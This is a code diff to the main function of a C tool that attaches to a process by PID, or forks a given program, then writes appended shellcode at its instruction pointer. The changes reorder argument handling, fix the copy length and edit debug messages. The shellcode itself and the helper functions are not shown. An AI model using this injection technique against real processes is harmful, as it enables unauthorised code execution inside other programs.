@@ -160,62 +160,15 @@ int main(int argc, char *argv[])
 
   int ret; // to be used again and again
   pid_t pid;
-  char *pathname;
 
-  if(argc == 3)
-  {
-
-    // handling argv[1]
-
-    char *str;
-    long nr = strtol(argv[1], &str, 10);
-
-    if(strlen(str) == 0)
-    {
-      // argv[1] is PID
-      pid = (pid_t)nr;
-    } else
-    {
-      // argv[1] is pathname
-      // fork() and get PID
-      #ifdef __OUTPUT__
-      printf("%s Starting child.\n", INFO);
-      #endif
-      pid = fork();
-
-      if(pid == 0)
-      {
-        child(argv[1]);
-      }
-      #ifdef __OUTPUT__
-      printf("%s Child PID: %i.\n", INFO, pid);
-      #endif
-    }
-
-    // handling argv[2]
-    pathname = argv[2];
-
-  } else
+  if(argc != 3)
   {
     HELP(argv[0]);
   }
 
-  ret = attach(pid);
-  if (ret != 0)
-  {
-    #ifdef __OUTPUT__
-    printf("%s Failed to attach to process: %s\n", ERR, strerror(errno));
-    #endif
+  // handling argv[2] before argv[1]
 
-    exit(1);
-  }
-  #ifdef __OUTPUT__
-  printf("%s Attached to process %i. Preparing shellcode.\n", INFO, pid);
-  #endif
-
-  // appending `pathname` to shellcode
-
-  shellcode_size = strlen(base_shellcode) + strlen(pathname) + 1;
+  shellcode_size = strlen(base_shellcode) + strlen(argv[2]) + 1;
 
   #ifdef __DEBUG__
   printf("%s Shellcode size: %i\n", DEBUG, shellcode_size);
@@ -223,7 +176,7 @@ int main(int argc, char *argv[])
 
   shellcode = malloc(shellcode_size);
   strcpy(shellcode, base_shellcode);
-  strcat(shellcode, pathname);
+  strcat(shellcode, argv[2]);
   strcat(shellcode, "\0");
 
   #ifdef __DEBUG__
@@ -239,6 +192,46 @@ int main(int argc, char *argv[])
   printf("\n");
   #endif
 
+  // handling argv[1]
+
+  char *str;
+  long nr = strtol(argv[1], &str, 10);
+
+  if(strlen(str) == 0)
+  {
+    // argv[1] is PID
+    pid = (pid_t)nr;
+  } else
+  {
+    // argv[1] is pathname
+    // fork() and get PID
+    #ifdef __OUTPUT__
+    printf("%s Starting child.\n", INFO);
+    #endif
+    pid = fork();
+
+    if(pid == 0)
+    {
+      child(argv[1]);
+    }
+    #ifdef __OUTPUT__
+    printf("%s Child PID: %i.\n", INFO, pid);
+    #endif
+  }
+
+  ret = attach(pid);
+  if (ret != 0)
+  {
+    #ifdef __OUTPUT__
+    printf("%s Failed to attach to process: %s\n", ERR, strerror(errno));
+    #endif
+
+    exit(1);
+  }
+  #ifdef __OUTPUT__
+  printf("%s Attached to process %i.\n", INFO, pid);
+  #endif
+
   PTR_T ip = get_ip_reg(pid);
 
   #ifdef __DEBUG__
@@ -249,7 +242,7 @@ int main(int argc, char *argv[])
   printf("%s Injecting shellcode...\n", INFO);
   #endif
 
-  for(int i = 0; i < strlen(shellcode); i++, ip++)
+  for(int i = 0; i < strlen(shellcode) + 1; i++, ip++)
   {
     // too much output
     //#ifdef __DEBUG__
@@ -292,11 +285,14 @@ int main(int argc, char *argv[])
   {
     case SIGTRAP:
       printf("%s Shellcode seems to have executed.\n", INFO);
+      #ifdef __DEBUG__
+      printf("%s This could be a false positive.\n", DEBUG);
+      #endif
       break;
     case SIGSEGV:
       printf("%s Shellcode caused the program to segfault.\n", ERR);
       #ifdef __DEBUG__
-      printf("%s This could be caused by the shellcode exceeding the program bounds.\n", DEBUG);
+      printf("%s It does this sometimes... Try, try again :)\n", DEBUG);
       #endif
       break;
   }
